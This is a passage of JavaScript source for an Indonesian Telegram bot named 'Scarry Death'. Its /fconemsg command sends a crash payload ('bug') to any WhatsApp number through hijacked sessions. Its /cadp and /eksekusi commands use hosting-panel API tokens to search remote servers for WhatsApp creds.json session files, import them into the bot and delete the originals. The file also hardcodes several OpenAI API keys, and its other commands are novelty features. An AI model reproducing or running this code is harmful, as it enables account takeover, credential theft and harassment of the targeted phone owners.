    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/fconemsg (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const date = getCurrentDate();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(userId);
  const chatType = msg.chat.type;
  const isPremium = await premium(senderId);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  if (isGroupOnly() && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  if (blacklistedCommands.includes("/fconemsg")) {
    return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isPremium) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Template caption
    const baseCaption = `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING 
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fconemsg
⪧ Virus  : Forclose One Msg Infinity
⪧ Status : {STATUS}
⪧ Date now : ${date}

©️ 𝓢𝓬𝓪𝓻𝓻𝔂 𝓓𝓮𝓪𝓽𝓱 𝓥 107 𝓖𝓮𝓷 87
</blockquote>
`;

    // Kirim pesan awal
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: baseCaption.replace("{STATUS}", "▰▱▱▱▱ 10%"),
      parse_mode: "HTML",
    });

    // Progress bar builder
    function makeBar(percent) {
      const total = 5;
      const filled = Math.round((percent / 100) * total);
      return "▰".repeat(filled) + "▱".repeat(total - filled) + ` ${percent}%`;
    }

    // Show step-by-step loading
    async function animateLoading(chat_id, message_id) {
      const steps = [10, 30, 60, 80, 95, 100];
      for (let i = 0; i < steps.length; i++) {
        const p = steps[i];
        const updatedCaption = baseCaption.replace("{STATUS}", makeBar(p));
        try {
          await bot.editMessageCaption(updatedCaption, {
            chat_id,
            message_id,
            parse_mode: "HTML",
          });
        } catch (e) {
          console.warn("Gagal update loading:", e.message);
        }
        await new Promise((resolve) => setTimeout(resolve, 800));
      }
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // Tampilkan animasi loading
    animateLoading(chatId, sentMessage.message_id);

    // Eksekusi
    await iosraraa3(target);

    // Edit pesan final sukses
    await bot.editMessageCaption(
      baseCaption.replace("{STATUS}", "Succses.."),
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]],
        },
      }
    );

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});


if (typeof okBox === 'undefined') global.okBox = a => "```" + " SCARRY DEATH SUCCES\n" + a.join("\n") + "```"
if (typeof errBox === 'undefined') global.errBox = a => "```" + " SCARRY DEATH ERROR\n" + a.join("\n") + "```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR = path.join(__dirname, 'adp')
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, 'adp.json')

function loadADP() {
  try { return JSON.parse(fs.readFileSync(ADP_FILE, 'utf8')) }
  catch { return {} }
}

function saveADP(o) { fs.writeFileSync(ADP_FILE, JSON.stringify(o, null, 2)) }
function isPtlc(t) { return typeof t === 'string' && /^ptlc_/i.test(t) }
function isPtla(t) { return typeof t === 'string' && /^ptla_/i.test(t) }
function asText(x) { return typeof x === 'string' ? x : JSON.stringify(x) }
function baseUrl(d) {
  let u = String(d || '').trim()
  if (!/^https?:\/\//i.test(u)) u = 'https://' + u
  return u.replace(/\/+$/, '')
}

async function httpGet(url, token) {
  return AX.get(url, { headers: { Authorization: `Bearer ${token}` } })
}

async function httpPost(url, token, data) {
  return AX.post(url, data, {
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json'
    }
  })
}

async function fetchAllPages(url, token) {
  let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
      page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc) {
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x => ({ id: x.attributes.identifier, name: x.attributes.name || x.attributes.identifier }))
}

async function listServersApplication(b, ptla) {
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x => {
    const at = x.attributes || {}
    return {
      id: at.identifier || at.uuidShort || at.uuid,
      name: at.name || at.identifier || at.uuidShort
    }
  }).filter(x => x.id)
}

async function listServersWithFallback(b, ptlc, ptla) {
  if (isPtlc(ptlc)) { try { const s = await listServersClient(b, ptlc); if (s.length) return s } catch { } }
  if (isPtla(ptla)) { try { const s = await listServersApplication(b, ptla); if (s.length) return s } catch { } }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir) {
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if (r.status === 200) return (r.data?.data || []).map(x => x.attributes || x)
    } catch { }
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if (r.status === 200) return (r.data?.data || []).map(x => x.attributes || x)
    } catch { }
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath) {
  if (isPtla(ptla)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if (r.status === 200) return asText(r.data)
    } catch { }
  }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if (r.status === 200) return asText(r.data)
    } catch { }
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath) {
  const body = { root: "/", files: [String(filePath).replace(/^\/+/, '')] }
  if (isPtlc(ptlc)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body)
      if (r.status === 204 || r.status === 200) return
    } catch { }
  }
  if (isPtla(ptla)) {
    try {
      const r = await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body)
      if (r.status === 204 || r.status === 200) return
    } catch { }
  }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150) {
  for (const qp of QUICK_PATHS) {
    try { await readFileAny(base, ptla, ptlc, sid, qp); return [qp] } catch { }
  }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0

  while (q.length && depth < maxDepth && expanded < maxDirs) {
    const size = q.length
    for (let i = 0; i < size && expanded < maxDirs; i++) {
      const dir = q.shift()
      expanded++
      let items = []
      try { items = await listDirAny(base, ptlc, ptla, sid, dir) } catch { }
      for (const it of items) {
        const name = String(it.name || '')
        const isDir = (it.is_file === false) || (it.type === 'directory') || (it.directory === true) || (it.is_directory === true)
        if (!isDir) {
          if (name.toLowerCase() === 'creds.json') {
            const p = `${(it.directory || dir).replace(/\/+$/, '')}/${name}`
            return [p]
          }
          continue
        }
        if (name === '.' || name === '..') continue
        const child = `${(it.directory || dir).replace(/\/+$/, '')}/${name}`
        if (!seen.has(child)) { seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0, 2)
}

async function writeAndPairFromRaw(raw, chatId) {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try {
    await fs.writeFile(path.join(tmp, 'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp, 'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions === 'function') saveActiveSessions(n)
    if (typeof connectToWhatsApp === 'function') await connectToWhatsApp(n, chatId)
    return n
  } finally {
    await fs.remove(tmp).catch(() => { })
  }
}

function pLimit(n) {
  let a = 0, q = []
  const next = () => {
    if (q.length && a < n) {
      a++
      const { fn, rs, rj } = q.shift()
      fn().then(v => { a--; rs(v); next() }).catch(e => { a--; rj(e); next() })
    }
  }
  return fn => new Promise((rs, rj) => { q.push({ fn, rs, rj }); next() })
}

// === BOT COMMANDS ===

bot.onText(/^\/cadp\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }
 if (blacklistedCommands.includes('/cadp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
  const key = m[1]
  const parts = m[2].split(",").map(s => s.trim())
  if (parts.length < 3)
    return bot.sendMessage(chatId, errBox(["Format: /cadp angka list <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })

  const [ptla, ptlc, domain] = parts
  const data = loadADP()
  data[key] = { ptla, ptlc, domain }
  saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/listadp$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

 if (blacklistedCommands.includes('/listadp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const data = loadADP()
  const mask = v => String(v || "").slice(0, 10) + (String(v || "").length > 10 ? "…" : "")
  const lines = Object.entries(data).map(([k, v]) => `${k} → ${v.domain || "-"} • ${mask(v.ptla)} • ${mask(v.ptlc)}`)
  await bot.sendMessage(chatId, lines.length ? okBox(lines) : errBox(["(kosong)"]), { parse_mode: "Markdown" })
})

bot.onText(/^\/deladp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

  if (blacklistedCommands.includes('/deladp')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const key = m[1]
  const data = loadADP()
  if (!data[key]) return bot.sendMessage(chatId, errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })

  delete data[key]
  saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/eksekusi\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.", { parse_mode: "Markdown" })
  }

if (blacklistedCommands.includes('/eksekusi')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  const key = m[1]
  const cfg = loadADP()[key]
  if (!cfg) return bot.sendMessage(chatId, errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })

  const b = baseUrl(cfg.domain)
  let servers = []

  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) return bot.sendMessage(chatId, errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal")
    return bot.sendMessage(chatId, errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }

  let ok = 0, fail = 0
  const perServerErrors = []
  const limit = pLimit(6)

  await bot.sendMessage(chatId, ` Eksekusi Adp target sedang berjalan...`)

  await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch { }
          ok++; paired = true; break
        } catch { }
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${e.message || "gagal"}`)
    }
  })))

  const lines = [` \n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
  await bot.sendMessage(chatId, okBox(lines), { parse_mode: "Markdown" })
})

// =============== [ FITUR /cecanvietnam ] ===============
bot.onText(/\/vietnam/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from.username || msg.from.first_name;

  await bot.sendMessage(chatId, `🔍 Tunggu sebentar @${user}, lagi cari cecan Vietnam... 🇻🇳💅`);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/r/cecan/vietnam",
      {},
      { responseType: "arraybuffer" }
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✨ Random Cecan Vietnam 🇻🇳",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API.");
  }
});


// =============== [ FITUR /cecanchina ] ===============
bot.onText(/\/china/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from.username || msg.from.first_name;

  await bot.sendMessage(chatId, `🔍 Tunggu sebentar @${user}, lagi cari cecan China... 🇨🇳💅`);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/r/cecan/china",
      {},
      { responseType: "arraybuffer" }
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✨ Random Cecan China 🇨🇳",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API.");
  }
});


// =============== [ FITUR /cecanthailand ] ===============
bot.onText(/\/thailand/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from.username || msg.from.first_name;

  await bot.sendMessage(chatId, `🔍 Tunggu sebentar @${user}, lagi cari cecan Thailand... 🇹🇭💅`);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/r/cecan/thailand",
      {},
      { responseType: "arraybuffer" }
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✨ Random Cecan Thailand 🇹🇭",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API.");
  }
});

// =============== [ FITUR /cecanjapan ] ===============
bot.onText(/\/japan/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from.username || msg.from.first_name;

  await bot.sendMessage(chatId, `🔍 Tunggu sebentar @${user}, lagi cari cecan Jepang... 🇯🇵💅`);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/r/cecan/japan",
      {},
      { responseType: "arraybuffer" } // karena hasilnya gambar (binary)
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✨ Random Cecan Jepang🇯🇵",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API.");
  }
});

// Command /artinama
bot.onText(/\/artinama (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1];

  try {
    await bot.sendMessage(chatId, `🔍 Mencari arti nama *${nama}*...`, { parse_mode: "Markdown" });

    const res = await axios.get(`https://api.siputzx.my.id/api/primbon/artinama?nama=${encodeURIComponent(nama)}`);
    const result = res.data;

    if (!result || !result.status || !result.data) {
      return bot.sendMessage(chatId, "⚠️ Tidak ditemukan arti nama untuk input tersebut.");
    }

    const { nama: namaAsli, arti } = result.data;

    // Format hasil pakai code block ```
    const text = `
📖 *Arti Nama:* ${namaAsli}

\`\`\`
${arti}
\`\`\`

🔮 *Sumber:* Scarry Death
    `;

    bot.sendMessage(chatId, text.trim(), { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Error:", err.message);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data dari API. Pastikan server aktif dan coba lagi nanti.");
  }
});

// Jika user lupa input nama
bot.onText(/\/artinama$/, (msg) => {
  bot.sendMessage(msg.chat.id, "❗ Gunakan format:\n`/artinama <nama>`\n\nContoh: `/artinama Raraa`", {
    parse_mode: "Markdown",
  });
});

// === AI OpenAI with Simple API Key Rotation ===
// Pastikan sudah ada:
// const bot = new TelegramBot(...)
// const axios = require("axios");
const OPENAI_KEYS = [
  "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",
  "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",
  "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",
  "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",
  "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",
];

let currentKeyIndex = 0;
let aiEnabled = false; // 🔘 Status AI (on/off)

function getActiveKey() {
  return OPENAI_KEYS[currentKeyIndex];
}

function switchToNextKey() {
  currentKeyIndex = (currentKeyIndex + 1) % OPENAI_KEYS.length;
  console.log(`🔁 Pergantian API Key → Sekarang pakai key index ${currentKeyIndex}`);
}

async function askAI(prompt) {
  for (let i = 0; i < OPENAI_KEYS.length; i++) {
    const apiKey = getActiveKey();
    console.log(`🧠 Kirim ke OpenAI pakai KEY index ${currentKeyIndex}`);

    try {
      const res = await axios.post(
        "https://api.openai.com/v1/chat/completions",
        {
          model: "gpt-4o-mini",
          max_tokens: 750,
          messages: [
            { role: "system", content: "Kamu adalah ScarryAI, asisten AI ramah & cerdas." },
            { role: "user", content: prompt },
          ],
        },
        {
          headers: {
            Authorization: `Bearer ${apiKey}`,
            "Content-Type": "application/json",
          },
        }
      );

      return res.data.choices[0].message.content.trim(); // ✅ Berhasil → return hasil ai
    } catch (err) {
      const resErr = err?.response?.data?.error;

      console.log(`❌ Error pakai key index ${currentKeyIndex}`, resErr?.code || err.message);

      if (resErr?.code === "rate_limit_exceeded" || resErr?.code === "insufficient_quota") {
        switchToNextKey(); // ganti key kalau limit / habis
      } else {
        return "❌ Terjadi kesalahan AI yang tidak diketahui.";
      }
    }
  }

  return "⚠️ Semua API Key habis/limit. Coba lagi nanti.";
}

// === Handler /ai hanya untuk 'on' dan 'off' (tidak menerima pertanyaan langsung) ===
bot.onText(/^\/ai(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argRaw = match[1];
  const arg = argRaw ? argRaw.trim().toLowerCase() : null;

  // Jika tidak ada argumen -> beri instruksi pakai on/off
  if (!arg) {
    return bot.sendMessage(chatId, "❌ Perintah /ai hanya untuk kontrol mode:\n- /ai on  → aktifkan auto-reply AI\n- /ai off → matikan auto-reply AI");
  }

  // Hanya terima 'on' atau 'off'
  if (arg === "on") {
    aiEnabled = true;
    return bot.sendMessage(chatId, "✅ Mode AI diaktifkan.\nBot akan otomatis membalas semua pesan teks.");
  }

  if (arg === "off") {
    aiEnabled = false;
    return bot.sendMessage(chatId, "🛑 Mode AI dimatikan.\nBot tidak akan membalas pesan otomatis.");
  }

  // Untuk argumen selain on/off (mis. '/ai halo') -> jangan panggil AI, beri instruksi
  return bot.sendMessage(chatId, "❌ Perintah tidak dikenali. Gunakan hanya `/ai on` atau `/ai off`.\nContoh: /ai on");
});

// === Auto-reply semua pesan kalau AI ON ===
bot.on("message", async (msg) => {
  if (!aiEnabled) return; // kalau AI off → skip
  if (!msg.text) return; // hanya tanggapi teks
  if (msg.text.trim().startsWith("/ai")) return; // jangan respon command /ai apa pun

  const chatId = msg.chat.id;
  const text = msg.text.trim();

  try {
    await bot.sendChatAction(chatId, "typing");
    const reply = await askAI(text);
    bot.sendMessage(chatId, reply, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Error auto-reply AI:", e);
  }
});

bot.onText(/\/sertifikat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  bot.sendMessage(chatId, `🧾 Membuat sertifikat tolol untuk: *${text}*...`, { parse_mode: "Markdown" });

  try {
    // Panggil API sertifikat
    const url = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    // Kirim hasil gambar ke user
    await bot.sendPhoto(chatId, response.data, {
      caption: `🤣 Nih sertifikat tolol buat *${text}*!`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error("Error ambil sertifikat:", err.message);
    bot.sendMessage(chatId, "❌ Gagal membuat sertifikat. Coba lagi nanti ya~");
  }
});

// Jika user cuma kirim /sertifikat tanpa nama
bot.onText(/\/sertifikat$/, (msg) => {
  bot.sendMessage(msg.chat.id, "⚠️ Contoh penggunaan:\n/sertifikat Raraa");
});

// Command utama /waifu
bot.onText(/\/waifu/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "🎴 Sedang mencari waifu acak... tunggu sebentar!");

  try {
    // Panggil API waifu
    const response = await axios.get("https://api-faa.my.id/faa/waifu", {
      responseType: "arraybuffer",
    });

    // Kirim hasil gambar
    await bot.sendPhoto(chatId, response.data, {
      caption: "💞 Nih waifumu hari ini 😚",
    });
  } catch (err) {
    console.error("Error mengambil waifu:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mendapatkan waifu. Coba lagi nanti ya~");
  }
});

// =============== [ FITUR /cecankorea ] ===============
bot.onText(/\/korea/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from.username || msg.from.first_name;

  await bot.sendMessage(chatId, `🔍 Tunggu sebentar @${user}, lagi cari cecan Korea... 🇰🇷💅`);

  try {
    const response = await axios.post(
      "https://api.siputzx.my.id/api/r/cecan/korea",
      {},
      { responseType: "arraybuffer" } // hasil binary (gambar)
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✨ Random Cecan Korea 🇰🇷",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API.");
  }
});

// /cecan command
bot.onText(/\/indonesia/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "🔍 Mengambil foto cecan Indonesia...");

  try {
    // API ini mengembalikan langsung gambar (binary)
    const response = await axios.get("https://api.siputzx.my.id/api/r/cecan/indonesia", {
      responseType: "arraybuffer",
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, response.data, {
      caption: "✨ Nih cecan Indonesia buat kamu 😍",
    });
  } catch (err) {
    console.error("Error ambil gambar:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil gambar. Mungkin API sedang down atau error.");
  }
});

// Fitur /info
bot.onText(/\/info/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message; // jika ada reply

  let targetUser;

  if (reply) {
    targetUser = reply.from;
  } else {
    targetUser = msg.from;
  }

  const userId = targetUser.id;
  const firstName = targetUser.first_name || '-';
  const lastName = targetUser.last_name || '-';
  const username = targetUser.username ? `@${targetUser.username}` : '-';
  const usernameLength = targetUser.username ? targetUser.username.length : 0;

  const infoText = `
<b>👤 INFO PENGGUNA</b>
🆔 ID: <code>${userId}</code>
📛 Nama Depan: <code>${firstName}</code>
📛 Nama Belakang: <code>${lastName}</code>
🏷️ Username: <code>${username}</code>
🔢 Panjang Username: <code>${usernameLength}</code>
  `;

  bot.sendMessage(chatId, infoText, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
});

// === FITUR BROADCAST FOTO + TEKS ===
bot.onText(/\/broadcast/, async (msg) => {
  const senderId = msg.from.id.toString();
  if (!config.OWNER_ID.includes(senderId)) {
    return bot.sendMessage(senderId, "❌ Kamu tidak punya izin broadcast.");
  }

  const replyMsg = msg.reply_to_message;
  if (!replyMsg) {
    return bot.sendMessage(senderId, "⚠️ Reply pesan teks/foto yang mau kamu kirim.");
  }

  async function getUsersFromGitHub() {
    try {
      const res = await axios.get(GITHUB_FILE_URL + "?t=" + Date.now());
      return res.data || [];
    } catch {
      return [];
    }
  }

  const users = await getUsersFromGitHub();
  let success = 0, failed = 0;

  await bot.sendMessage(senderId, `🚀 Mengirim broadcast ke ${users.length} pengguna...`);

  for (const id of users) {
    try {
      if (replyMsg.photo) {
        const photoId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
        const caption = replyMsg.caption || "";
        await bot.sendPhoto(id, photoId, { caption });
      } else if (replyMsg.text) {
        await bot.sendMessage(id, replyMsg.text);
      }
      success++;
    } catch {
      failed++;
    }
  }

  await bot.sendMessage(senderId, `✅ Broadcast selesai!\nBerhasil: ${success}\nGagal: ${failed}`);
});

// ===== FAKECALL COMMAND (Versi reply foto, format: /fakecall nama,durasi) 
bot.onText(/^\/fakecall (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].split(",");

  const nama = input[0]?.trim();
  const durasi = input[1]?.trim();

  // validasi input
  if (!nama || !durasi) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nGunakan format:\n`/fakecall Nama,Durasi`\n\nContoh:\n`/fakecall Rara,5`\n\nLalu *reply* ke foto yang ingin dijadikan avatar.",
      { parse_mode: "Markdown" }
    );
  }

 if (blacklistedCommands.includes('/fakecall')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  // pastikan user reply ke foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Harap *reply ke foto* yang ingin dijadikan avatar.\n\nLangkah:\n1️⃣ Kirim foto\n2️⃣ Balas dengan `/fakecall Nama,Durasi`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `📞 Membuat fake call dari *${nama}*...`, {
    parse_mode: "Markdown",
  });

  try {
    // Ambil file_id dari foto yang di-reply
    const photoList = msg.reply_to_message.photo;
    const fileId = photoList[photoList.length - 1].file_id;

    // Ambil URL file Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // API Zenzxz (ganti apikey jika perlu)
    const apiKey = "YOUR_API_KEY"; // opsional jika API butuh apikey
    const apiUrl = `https://api.zenzxz.my.id/api/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileUrl
    )}${apiKey ? `&apikey=${apiKey}` : ""}`;

    // Ambil hasil gambar dari API
    const response = await fetch(apiUrl);
    if (!response.ok) throw new Error("Gagal ambil hasil dari API.");

    const buffer = Buffer.from(await response.arrayBuffer());

    // Kirim hasil ke chat
    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Fake call berhasil dibuat!\n📱 *Nama:* ${nama}\n⏱️ *Durasi:* ${durasi} detik`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error("[FAKECALL ERROR]", err);
    bot.sendMessage(
      chatId,
      "⚠️ Gagal membuat fake call.\nPeriksa koneksi API atau format perintah."
    );
  }
});

// ===== EMOJIMIX COMMAND FIXED =====
bot.onText(/^\/emojimix(?:\s+(.+)\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let emoji1 = match[1];
  let emoji2 = match[2];

  // Jika user membalas pesan (reply)
  if ((!emoji1 || !emoji2) && msg.reply_to_message && msg.reply_to_message.text) {
    const parts = msg.reply_to_message.text.split(" ");
    if (parts.length >= 2) {
      emoji1 = parts[0];
      emoji2 = parts[1];
    } else {
      return bot.sendMessage(chatId, "❌ Harap balas pesan berisi dua emoji atau ketik: `/emojimix 😎 🤣`", {
